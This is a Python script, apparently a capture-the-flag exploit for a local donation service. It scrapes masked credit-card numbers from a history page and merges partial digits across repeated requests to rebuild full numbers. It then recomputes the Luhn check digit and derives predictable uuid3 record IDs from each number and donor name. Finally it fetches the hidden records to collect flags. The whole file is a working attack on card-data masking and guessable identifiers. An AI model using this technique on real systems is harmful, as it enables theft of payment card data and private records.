#!/usr/bin/python

import uuid
import requests
from bs4 import BeautifulSoup

history_link = "http://localhost:31415/donation/credits/history"
info_link = "http://localhost:31415/donation/credits/info?id="

dons = {}
links = []
flags = []

def sum_strings(s1, s2):
    if len(s1)==len(s2)==16:
        return ''.join([s1[i] if s1[i].isdigit() else s2[i] for i in range(16)])

def get_numbers():
    with requests.Session() as s:
        page = s.get(history_link)
        if (page.status_code == 200):
            soup = BeautifulSoup(page.text, "lxml")
            table = soup.findAll('table')[0]
            rows = table.findAll('tr')

            for row in rows[1:]:
                name = str(row.findAll('td')[1])[4:-5]
                number = str(row.findAll('td')[2])[4:-5]
                if dons.get(name):
                    i_have = dons.get(name)
                    dons[name] = sum_strings(i_have, number)
                    # magic
                else:
                    dons[name] = number
            return dons

def calc_first():
    for key, value in dons.iteritems():
        sum = 0
        for i in range(1,len(value)):
            a = int(value[i])
            if (i%2 != 0):
                a *= 2
                if (a>9):
                    a -= 9
            sum += a
        # print "sum: %d" % sum
        value = str((10 - (sum % 10)) % 10) + value[1:]
        dons[key] = value
    return dons

def get_links():
    for key, value in dons.iteritems():
        my_uuid = uuid.uuid3(uuid.NAMESPACE_X500, value+key)
        links.append(info_link+str(my_uuid))

    for l in links:
        r = requests.get(l)
        if r.status_code == 200:
            soup = BeautifulSoup(r.text, "lxml")
            table = soup.findAll('table')[0]
            rows = table.findAll('tr')

            for row in rows[1:]:
                flags.append(str(row.findAll('td')[2])[4:-5])
    return flags

[get_numbers() for i in xrange(10)]
calc_first()
get_links()
